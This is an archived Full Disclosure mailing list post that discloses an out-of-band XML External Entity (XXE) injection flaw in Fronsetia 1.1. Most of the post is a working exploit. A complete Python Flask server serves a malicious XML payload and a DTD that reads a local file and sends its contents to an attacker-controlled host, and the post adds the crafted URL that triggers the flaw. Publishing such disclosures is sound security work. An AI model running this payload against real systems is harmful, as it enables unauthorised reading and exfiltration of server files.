---
title: XXE OOB - fronsetiav1.1
url: https://seclists.org/fulldisclosure/2024/Nov/9
source: Full Disclosure
date: 2024-11-22
fetch_date: 2025-10-06T19:22:59.003022
---

# XXE OOB - fronsetiav1.1

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# XXE OOB - fronsetiav1.1

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Thu, 21 Nov 2024 17:46:46 +0000

---

```
# Exploit Title: XXE OOB - fronsetiav1.1
# Date: 11/2024
# Exploit Author: Andrey Stoykov
# Version: 1.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-15-oob-xxe.html

XXE OOB

Description:

- It was found that the application was vulnerable XXE (XML External Entity
Injection)

Steps to Reproduce:

1. Add Python3 server to serve malicious XXE payload
2. Add a file on the file system to be read via the application XXE payload
echo 123123 > /tmp/123
3. Enter the following URL as input
http://192.168.78.128:8080/fronsetia/show_operations.jsp?Fronsetia_WSDL=http://192.168.78.1:10000/testxxeService?wsdl

// Python Server Code

from flask import Flask, Response, request
import logging

app = Flask(__name__)

# Set up logging
logging.basicConfig(level=logging.DEBUG)

@app.route('/testxxeService', defaults={'path': ''})
def catch_all(path):
    app.logger.debug("Serving XXE payload")
    xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http:// 192.168.78.1:10000/data.dtd"> %dtd;
]>
<data>&send;</data>"""
    return Response(xml, mimetype='text/xml', status=200)

@app.route('/data.dtd', defaults={'path': ''})
def hello(path):
    app.logger.debug("DTD requested")
    xml = """<!ENTITY % file SYSTEM "file:///tmp/123">
<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM '
http://192.168.78.1:8000/?content=%file;';>">
%eval;
%exfil;"""
    return Response(xml, mimetype='text/xml', status=200)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **XXE OOB - fronsetiav1.1** *Andrey Stoykov (Nov 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")